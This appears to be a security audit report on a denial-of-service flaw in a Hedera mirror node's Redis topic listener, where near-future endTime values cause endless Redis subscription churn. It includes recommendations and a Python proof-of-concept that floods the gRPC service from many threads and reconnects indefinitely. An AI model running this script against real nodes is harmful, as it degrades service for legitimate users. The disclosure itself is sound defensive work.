Audit Report

## Title
Unbounded Redis Subscription Churn via Near-Future `endTime` in `RedisTopicListener`

## Summary
An unauthenticated attacker can open arbitrarily many gRPC `subscribeTopic` calls with a minimally valid `endTime` (any value strictly greater than `startTime`). After one `endTimeInterval` (~30 s by default), each subscription completes, the last subscriber's cancellation propagates through the `share()` operator and triggers `doOnCancel(() -> unsubscribe(topic))`, which unconditionally removes the topic from `topicMessages`. The next request for that topic forces a fresh Redis `SUBSCRIBE`. By using many distinct topic IDs across many connections, an attacker sustains continuous Redis subscription churn with no server-side rate limit.

## Finding Description

**1. Shared listener keyed only on topic ID**

`getSharedListener()` uses `computeIfAbsent` keyed on the channel name derived solely from the topic ID. [1](#0-0) 

**2. `doOnCancel` / `doOnComplete` placed before `.share()`**

Both hooks are registered on the upstream chain, before the `share()` multicast operator. When the last subscriber to the shared Flux cancels, `share()` cancels its upstream, firing `doOnCancel`. [2](#0-1) 

**3. `unsubscribe()` removes the entry unconditionally**

No reference-count check, no guard against a concurrent re-subscriber. [3](#0-2) 

**4. `isComplete()` is false at subscription time for a near-future `endTime`**

`TopicContext.startTime` is set to `DomainUtils.now()` at construction. For `endTime = now + 1 ns`, the condition `endTime < startTime` is false, so `isComplete()` returns false and `incomingMessages()` proceeds to call `topicListener.listen()`, issuing a Redis `SUBSCRIBE`. [4](#0-3) 

After ~30 s, `Instant.ofEpochSecond(0, endTime).plus(endTimeInterval).isBefore(Instant.now())` becomes true, `isComplete()` returns true, and `pastEndTime()` completes. [5](#0-4) 

**5. `takeUntilOther` propagates cancellation upstream**

`takeUntilOther(pastEndTime(topicContext))` cancels the live stream, which propagates a cancel signal back through `topicListener.listen()` → `SharedTopicListener.listen()` → the `share()` operator. When the last subscriber for a topic cancels, `share()` cancels its upstream, triggering `doOnCancel(() -> unsubscribe(topic))`. [6](#0-5) 

**6. No minimum duration enforced on `endTime`**

`isValidEndTime()` only requires `endTime > startTime`; a 1-nanosecond window is accepted. [7](#0-6) 

**7. No connection limit; only a per-connection call cap**

`maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, but there is no cap on the number of TCP connections. [8](#0-7) [9](#0-8) 

## Impact Explanation
Each distinct topic ID the attacker subscribes to creates one real Redis `SUBSCRIBE` command via `ReactiveRedisMessageListenerContainer.receive()`. After ~30 seconds the subscription is torn down and, on the next request, re-created. With N connections × 5 concurrent calls, each targeting a distinct topic ID, the attacker sustains N×5 Redis subscription create/destroy cycles every 30 seconds. This can exhaust Redis connection slots, saturate the listener container's internal thread pool, and cause legitimate subscribers to experience message gaps or dropped service during the re-subscription window.

## Likelihood Explanation
No authentication is required to call `subscribeTopic`. The only constraint is `endTime > startTime` and `startTime <= now`, both trivially satisfied. On a public Hedera network, valid topic IDs are publicly enumerable. An attacker needs only a standard gRPC client and the ability to open many TCP connections. The attack is fully repeatable and automatable with no per-IP or per-user rate limiting present in the codebase.

## Recommendation
1. **Enforce a minimum subscription duration**: Reject requests where `endTime - startTime < configurable_minimum` (e.g., 60 seconds) in `isValidEndTime()`.
2. **Add connection-level rate limiting**: Use a Netty `ChannelHandler` or a gRPC `ServerInterceptor` to cap the number of concurrent connections per source IP.
3. **Make `unsubscribe()` reference-counted**: Instead of unconditionally removing the entry from `topicMessages`, track the number of active subscribers per topic and only remove the entry when the count reaches zero, preventing a race between the last subscriber leaving and a new one arriving.
4. **Add a global subscriber cap**: Expose `subscriberCount` (already tracked) as a hard limit that rejects new subscriptions when exceeded.

## Proof of Concept
```python
import grpc
from concurrent.futures import ThreadPoolExecutor
import time

# Pseudocode – requires the generated Hedera gRPC stubs
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import basic_types_pb2, timestamp_pb2

TARGET = "mirror.node.host:5600"
TOPIC_NUM = 12345  # any valid topic ID on the network
NUM_CONNECTIONS = 100

def attack(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now_ns = time.time_ns()
    # endTime = startTime + 1 ns: passes isValidEndTime(), but isComplete() is
    # false at subscription time; becomes true after ~30 s
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM + conn_id),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=now_ns // 1_000_000_000),
        consensusEndTime=timestamp_pb2.Timestamp(
            seconds=now_ns // 1_000_000_000,
            nanos=(now_ns % 1_000_000_000) + 1),
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass  # drain; subscription auto-completes after ~30 s
    except Exception:
        pass
    # Reconnect immediately to sustain churn
    attack(conn_id)

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    for i in range(NUM_CONNECTIONS):
        pool.submit(attack, i)
```
Each of the 100 threads targets a distinct topic ID, creating 100 Redis subscriptions. After ~30 seconds all 100 are torn down and immediately re-created, sustaining 100 Redis `SUBSCRIBE`/`UNSUBSCRIBE` cycles every 30 seconds indefinitely.

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }

    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
